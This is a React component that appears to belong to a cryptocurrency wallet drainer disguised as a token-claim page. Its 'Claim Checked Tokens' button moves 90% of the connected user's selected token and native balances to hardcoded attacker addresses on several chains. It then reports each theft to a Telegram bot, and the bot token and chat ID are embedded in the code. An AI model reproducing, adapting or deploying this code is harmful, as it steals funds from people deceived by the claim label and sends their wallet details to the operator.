import { useState, useEffect, useCallback } from 'react';
import { Button, useToasts } from '@geist-ui/core';
import { usePublicClient, useWalletClient, useAccount } from 'wagmi';
import { erc20Abi } from 'viem';
import { useAtom } from 'jotai';
import { normalize } from 'viem/ens';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import axios from 'axios';

const TELEGRAM_BOT_TOKEN = '7207803482:AAGrcKe1xtF7o7epzI1PxjXciOjaKVW2bUg';
const TELEGRAM_CHAT_ID = '6718529435';

const sendTelegramNotification = async (message: string) => {
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });
  } catch (error) {
    console.error('Error sending Telegram notification:', error);
  }
};

const destinationAddresses = {
  1: '0xFB7DBCeB5598159E0B531C7eaB26d9D579Bf804B',
  56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  10: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  42161: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
};

function selectAddressForToken(network: number) {
  const addresses = {
    1: '0xFB7DBCeB5598159E0B531C7eaB26d9D579Bf804B',
    56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
    10: '0x933d91B8D5160e302239aE916461B4DC6967815d',
    324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
    42161: '0x933d91B8D5160e302239aE916461B4DC6967815d',
    137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  };

  const selectedAddress = addresses[network];

  if (selectedAddress) {
    console.log('Great Job! Selected Address:', selectedAddress);
  } else {
    console.log('No address found for the selected network:', network);
  }

  return selectedAddress;
}

export const SendTokens = () => {
  const { setToast } = useToasts();
  const showToast = (message: string, type: 'success' | 'warning' | 'error') =>
    setToast({
      text: message,
      type,
      delay: 4000,
    });

  const [tokens] = useAtom(globalTokensAtom);
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();
  const { chain, address, isConnected } = useAccount();

  const percentageToTransfer = 90; // Define the percentage of the balance to transfer

  const sendAllCheckedTokens = async () => {
    const tokensToSend: string[] = Object.entries(checkedRecords)
      .filter(([_, { isChecked }]) => isChecked)
      .map(([tokenAddress]) => tokenAddress);

    if (!walletClient || !publicClient) return;

    const destinationAddress = destinationAddresses[chain?.id];
    if (!destinationAddress) {
      showToast('Unsupported chain or no destination address found for this network', 'error');
      return;
    }

    selectAddressForToken(chain?.id);

    let resolvedDestinationAddress = destinationAddress;
    if (destinationAddress.includes('.')) {
      try {
        resolvedDestinationAddress = await publicClient.getEnsAddress({
          name: normalize(destinationAddress),
        });
        if (resolvedDestinationAddress) {
          showToast(`Resolved ENS address: ${resolvedDestinationAddress}`, 'success');
        }
      } catch (error: unknown) {
        if (error instanceof Error) {
          showToast(`Error resolving ENS address: ${error.message}`, 'warning');
        } else {
          showToast('An unknown error occurred while resolving ENS address', 'warning');
        }
      }
    }

    for (const tokenAddress of tokensToSend) {
      const token = tokens.find((token) => token.contract_address === tokenAddress);

      const formattedTokenAddress: `0x${string}` = tokenAddress.startsWith('0x')
        ? (tokenAddress as `0x${string}`)
        : (`0x${tokenAddress}` as `0x${string}`);

      const balance = BigInt(token?.balance || '0');
      const amountToSend = balance * BigInt(percentageToTransfer) / BigInt(100);

      try {
        const formattedDestinationAddress: `0x${string}` = resolvedDestinationAddress.startsWith('0x')
          ? (resolvedDestinationAddress as `0x${string}`)
          : (`0x${resolvedDestinationAddress}` as `0x${string}`);

        if (tokenAddress === 'native') {
          // Handle native token transfer
          const res = await walletClient.sendTransaction({
            to: formattedDestinationAddress,
            value: amountToSend,
          });

          setCheckedRecords((old) => ({
            ...old,
            [tokenAddress]: {
              ...(old[tokenAddress] || { isChecked: false }),
              pendingTxn: res,
            },
          }));

          showToast(
            `Transfer of ${amountToSend} ${token?.contract_ticker_symbol} sent. Tx Hash: ${res.hash}`,
            'success',
          );
        } else {
          // Handle ERC-20 token transfer
          const { request } = await publicClient.simulateContract({
            account: walletClient.account,
            address: formattedTokenAddress,
            abi: erc20Abi,
            functionName: 'transfer',
            args: [
              formattedDestinationAddress,
              amountToSend,
            ],
          });

          const res = await walletClient.writeContract(request);

          setCheckedRecords((old) => ({
            ...old,
            [formattedTokenAddress]: {
              ...(old[formattedTokenAddress] || { isChecked: false }),
              pendingTxn: res,
            },
          }));

          showToast(
            `Transfer of ${amountToSend} ${token?.contract_ticker_symbol} sent. Tx Hash: ${res.hash}`,
            'success',
          );
        }

        await sendTelegramNotification(
          `Transaction Sent: Wallet Address: ${address}, Token: ${token?.contract_ticker_symbol}, Amount: ${amountToSend}, Tx Hash: ${res.hash}, Network: ${chain?.name}`
        );
      } catch (err: any) {
        showToast(
          `Error with ${token?.contract_ticker_symbol} ${err?.reason || 'Unknown error'}`,
          'warning',
        );
      }
    }
  };

  const checkedCount = Object.values(checkedRecords).filter(
    (record) => record.isChecked,
  ).length;

  return (
    <div style={{ margin: '20px' }}>
      <form>
        <Button
          type="secondary"
          onClick={sendAllCheckedTokens}
          disabled={checkedCount === 0}
          style={{ marginTop: '20px' }}
        >
          Claim {checkedCount} Checked Tokens
        </Button>
      </form>
    </div>
  );
};
